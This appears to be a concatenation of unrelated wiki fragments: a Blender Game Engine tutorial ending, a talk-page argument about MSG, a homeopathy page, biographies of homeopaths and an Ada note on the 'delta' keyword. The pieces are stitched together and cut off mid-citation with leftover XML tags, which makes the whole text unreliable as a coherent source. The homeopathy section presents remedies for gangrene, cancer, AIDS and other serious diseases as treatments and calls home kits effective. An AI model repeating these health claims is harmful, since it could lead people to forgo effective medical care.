# Press '''P''' to start testing the game. You should see the red ball drop onto the hill.
# Press '''ESC''' to quit testing the game

[[Image:Rollingball.jpg|Rolling ball tutorial screen capture]]

== Video capturing your game ==

When you press the PKEY or click ''game, start play'', Blender will play it using the 3D view. Many rendering features are not shown in this 3D Window and it does not render the view in order to get good pictures with textures and lighting. You must capture your object that keep on changing(the actor) so that it can be animated.

''View'' -&gt; click View button
,        -&gt; next step
/        -&gt; alternative step
RMB      -&gt; right mouse button
IKEY      -&gt; press the I key on keyboard

Split window, ''IPO Curve Editor'' View, ''Game, Record Game Physics to IPO'',

''object mode'', RMB(select actor), IKEY/''select key frame'', ''Loc''(location of actor object only),

PKEY( play game), ESCKEY(stop game)

''scene''(F10), ''output'', f:\animation\ball (your file name),'' stamp, time, date, draw stamp, format,''(choose your output format)

''anim'', ''end''(ending frame), 270, ''step'', 10(for testing), ''ANIM/Render, Render Animation''/CTRL F12

== Conclusion ==

With the knowledge acquired in this tutorial, there are many things you could accomplish within the Blender Game Engine, although the majority of them would require more knowledge.  So read on, and work your way through the multitudinous seas of tutorials (That is, two).

      <text xml:space="preserve">Its not clear to me.  Is it the case that all consumers are irrational, or merely those consumers who prefer to avoid maufactured glutamates in unbound processed forms.  In what sense are we using the term consumer?  Do we mean consumers in the biologic sense or the more ambiguous economic sense?  Perhaps it would be more accurate to refer to them as eaters, or people, or even human beings.  

I'm not sure it is appropriate to include ad hominem in an ingredient entry in the Wiki Cookbook.  Maybe the word &quot;irrational&quot; should be deleted, and the various positions on MSG should be included.

For example, it is fairly clear that glutamates found in naturally occurring substances are bound to proteins.  In bound form, the human body can regulate the release of glutamates and the amount of stimulation of glutamate neurotransmiter receptors.  In unbound form, glutamates freely enter the bloodstream and can overstimulate glutamate neurotransmiter receptors (as is the case with many isolates chemicals human beings ingest).

[[User:4.244.150.169]]

:The percent values are for unbound glutamate only. The numbers for bound glutamate are much higher. Anything much beyond a half percent is more than a person would purposely add; several foods qualify. [[User:AlbertCahalan|AlbertCahalan]] 22:31, 15 Apr 2005 (UTC)

:If you think MSG is bad, you'd better learn about [[w:dihydrogen monoxide|dihydrogen monoxide]]. It's a common food additive that has caused many deaths. Just as with MSG, the government claims that dihydrogen monoxide is safe! [[User:AlbertCahalan|AlbertCahalan]] 00:25, 18 Apr 2005 (UTC)

::You may think that it is junk science, but other might not. Wikimedia projects are supposed to be NPOV. Some people might be sensitive to MSG, it is unknown. [[User:Reub2000|Reub2000]] 04:29, 6 Jun 2005 (UTC)</text>

      <text xml:space="preserve">What do you mean &quot;Irrational MSG Sales Promotion&quot;?

There's been a lot of crap pseudo-science by quacks trying to
blame MSG for every ailment. It's like some kind of patent medicine
in reverse.

The simple fact is that MSG is common in lots of foods you eat.
It's there in doses much higher than one would normally add.
Look at Parmesan, which has so much MSG that your taste buds are
maxed out. Nobody would add that amount.

Commercial MSG is indistinguishable in every way from any other
MSG. If you have trouble with this concept, study chemistry.

As for selling things... many of the anti-MSG sites you'll find on
the web are doing just that. They sell &quot;herbal supplements&quot; of
dubious value for exhorbant prices.

      <comment>/* Invention by Dr.Samuel Hahnemann (1755-1843) */</comment>
      <text xml:space="preserve">{{NPOV}}
{{Danger}}

==Invention by Dr.Samuel Hahnemann (1755-1843)==

Hahnemann was educated in medicine, science and linguistics.  He wrote a book on his research, &quot;The Organon of the Medical Art&quot;, and received 6 editions over his life.

That book explains what he thought was the nature of disease, the way homeopathic remedies may work and how to apply them. That is the core book for homeopaths when studying.

Homeopathy is very widely used now and homeopaths operate in many countries regardless of how affluent or poor the country is.  There are now over 3000 remedies &quot;proven&quot; and available for treating all types of disease.

We will later look more at homeopathic theory on a basic level, the principles of homeopathy and more importantly how homeopathy is supposed to be used with the intent of restoring health.  You can purchase homeopathy kits to have at home or when travelling cheaply and they are effective in acute diseases or minor accidents.  For longer term diseases, deeper rooted emotional, mental and/or physical problems, you need to visit a professional homeopath and attend a number of times. 

Finally, a word on science - it should be noted that no truly scientific study has shown that homeopathy works at all.But one point should be noted here that Homeopathic medicines are very much minute in its dosage that's why it is a fact that Experiments used in conventional medicines can not be used as it is in Homeopathy.

Homeopaths claim that their remedies are useful for a wide range of minor ailments, from cuts and bruises to coughs and colds. Patients often come to homeopaths with long-term problems which have not responded to conventional medicine, and homeopaths prescribe remedies to people with these conditions. Some of the common ailments for which patients seek homeopathic care are [[eczema]],[[Acne]],[[Chloasma]],[[Psoriasis]],[[Vitiligo]],[[Gastric Ulcers]],[[Complaints during pregnancy]],[[Cystic growths]], [[chronic fatigue syndrome]], [[asthma]], [[migraine]], [[irritable bowel syndrome]],[[ allergic disorders]], [[arthritis]], [[fibromyalgia]], [[hypertension]], [[Crohn's disease]], [[premenstrual syndrome]], [[rhinitis]], [[anxiety]] and [[depression]]. They also treat patients with the most serious diseases, including [[multiple sclerosis]], [[chronic obstructive pulmonary disease]], [[cancer]]&lt;ref&gt;[http://www.cancerhelp.org.uk/help/default.asp?page=251 Cancer Research UK]&lt;/ref&gt; and AIDS&lt;ref&gt;[http://www.amishhospital.com/aids.htm Amish Hospital and Research Center]&lt;/ref&gt;. For [[gangrene]], for example, homeopathic remedies are prescribed to strengthen a person's own defenses and to initiate healing; a very different approach from medical therapy. Some homeopathic remedies for gangrene include Arsenicum Album, Secale (from [[rye/ergot]]), and Carbo vegetabilis (from charcoal), amongst many others&lt;ref&gt;[http://www.hpathy.com/diseases/gangrene-symptoms-treatment-cure.asp Homeopathy for everyone]&lt;/ref&gt;.

Homeopaths claim that there is objective evidence that some of their treatments are beneficial.
Some other researchers also claim that there is scientific evidence that homeopathy helps in many problems and diseases&lt;ref name=Van_Wassenhoven&gt;{{citation |

Dr. James Tyler Kent

Dr. James Tyler Kent was born in 1849, a native of woodhull, new York. He graduated from Electic Medical institute, cincinnati, ohio in 1871 and the Homeopathic medical college of missouri, St. Louis, where he was awarded the Diploma in 1889. He was Professor of Anatomy in the American Medical College St. Louis, 1877-78 about which time his attention was forcibly directed to Homeopathy through the serious illness of his wife, whose case refused to yield to any other treatment except Homeopathic. He then became a careful student of Hahnemann's Organon which resulted in his complete conversion to Homeopathy. He was one of the ablest teachers and exponents of the Homeopathic school in America. His contribution to the Homeopathic literature are known by their strength rather than their length and include more prominently his Repertory, Homeopathic Philosophy, Lectures on Materia Medica and Lesser Writings.

Dr. Hering

Dr. Constantine Hering was born on 1st Jan. 1800 in Oschath in Saxony. He studied Medicine and then at the request of his teacher Dr. Henrich Robbi studied Homeopathy in order to write a book against Homeopathy. But since his infected hand which was to have been amputated was healed by Homeopathy, he became converted to Homeopathy and became one of the most famous Homeopaths. After getting his degree from Woodsburg he went to Surinam on an expedition. There he extracted the poison of the Lachesis snake and proved it. From then on he practised, taught and wrote on Homeopathy for the rest of his life, so much so, that Hahnemann called him as one of his 'most efficient disciples' and 'as the truest and most zealous propagator of our art.'

Dr.M.L. Sircar

Dr. Mahendra Lal Sircar, C, I .E&quot; M.D.. D. L., was not only the greatest Homeopath of his time in India, but also a great scientist. He was born on Nov. 2, 1833 in Paikpara, near Howrah. He appeared at the M.D. Examination in 1863 and came out first. He devoted his life wholly to the propagation of the principles of Homeopathy. The Calcutta Journal of Medicine, edited by him, was started in Jan. 1868 for this purpose. In the field of physical science, Dr. Sircar has made great contributions and was' a pioneer of .scientific research in India. Dr. J. C. Bose and Dr. P. C. Ray were also inspired by him. Recurrent malarial fever and bronchial asthma clouded the evening of his life and he died on Feb. 23, 1904.


 
Boger
Prominent as a physician and author of a number of medical text - books, Dr.Boger came to Parkersburg U.S.A. in 1888 and had since been engaged in the practice of medicine. He graduated from the Philadephia College of Medicine. He later studied at the Hahnemann Homeopathic Medical College in Philadelphia, from which also he graduated. During his long career in medical practice and research, Boger contributed important scientific text-books including the Synoptic Key of the Materia Medica addition to his authorship of a number o&quot; articles for medical journals.
His authorship of several scientific textbooks, his analysis and construction of Repertory, his lively translation of several medical books from notable German authors and his indefatigable labour for the production of orginal works, like the Times of the Remedies and Moon phases and his provings of Samarskite etc. made him universally recognised as an author and physician of great eminence. Dr. Boger passed away on 2nd Sep, 1935, at the age of 74.

== Description ==

This keyword is used in the declaration of [[Ada Programming/Types/delta|fixed point types]]. Delta represents the absolute error bound of a [[Ada Programming/Types/delta|fixed point type]]; that is, delta gives a hint to the compiler how to choose the smallest incremental value of the type, called the ''Small'' of the type. This Small value is accessible via the attribute T'Small.

For Ordinary fixed point types, it is by default a power of two not greater than the delta; it is specifyable by an attribute clause to be any value not greater than the delta.

For decimal fixed point types, the Small value is equal to the delta, which of course must be a power of ten.

== Example ==

 {{Ada/kw|type}} Fixed_Point {{Ada/kw|is}} {{Ada/kw|delta}} 0.01 {{Ada/kw|digits}} 10;  {{Ada/--|A decimal fixed point type}}
 My_Fixed_Point : Fixed_Point := 0.0;
 ...
 My_Fixed_Point := 0.1;   {{Ada/--|Ok}}
 My_Fixed_Point := 0.02;  {{Ada/--|Ok}}
 My_Fixed_Point := 0.001; {{Ada/--|Oops - this value is too small.}}
                          {{Ada/--|It will be represented by zero.}}
